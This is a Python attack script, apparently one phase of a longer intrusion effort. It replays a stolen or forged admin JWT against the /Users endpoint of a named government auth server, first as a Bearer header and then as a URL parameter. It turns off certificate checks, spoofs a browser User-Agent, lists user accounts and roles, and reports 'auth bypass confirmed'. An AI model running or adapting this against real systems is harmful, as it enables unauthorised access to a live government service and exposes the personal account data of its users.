#!/usr/bin/env python3
"""Phase 69: Quick JWT verification on EPCR Auth Server."""
import requests, urllib3, json
urllib3.disable_warnings()
PROXY = {}

# Load token
with open('/mnt/c/Users/Administrator/desktop/JySecAI/tpe119_evidence/jwt_admin_full.txt', 'r') as f:
    token = f.read().strip()

BASE = "https://epcr.tpf.gov.tw:4004"

# Test 1: Bearer header
print("=== Test 1: Bearer token on /Users ===")
r = requests.get(f"{BASE}/Users", proxies=PROXY, verify=False, timeout=15,
    headers={"Authorization": f"Bearer ***", "User-Agent": "Mozilla/5.0"})
print(f"Status: {r.status_code}, len={len(r.text)}")
if r.status_code == 200:
    print("SUCCESS! Auth bypass confirmed via Bearer header.")
    users = json.loads(r.text)
    print(f"Users returned: {len(users)}")
    if users:
        print(f"First user: {users[0]['account']} (role: {users[0]['Role']['name']})")

# Test 2: URL token
print("\n=== Test 2: URL ?token= on /Users ===")
r = requests.get(f"{BASE}/Users?token={token}", proxies=PROXY, verify=False, timeout=15,
    headers={"User-Agent": "Mozilla/5.0"})
print(f"Status: {r.status_code}, len={len(r.text)}")
if r.status_code == 200:
    print("SUCCESS! Auth bypass confirmed via URL token.")

# Test 3: Direct API call
print("\n=== Test 3: Direct API test ===")
r = requests.get(f"{BASE}/Users", proxies=PROXY, verify=False, timeout=15,
    headers={"Authorization": f"Bearer ***", "Accept": "application/json", "User-Agent": "Mozilla/5.0"})
print(f"Status: {r.status_code}")
if r.status_code != 200:
    print(f"Response: {r.text[:300]}")
else:
    print("AUTH BYPASS CONFIRMED!")
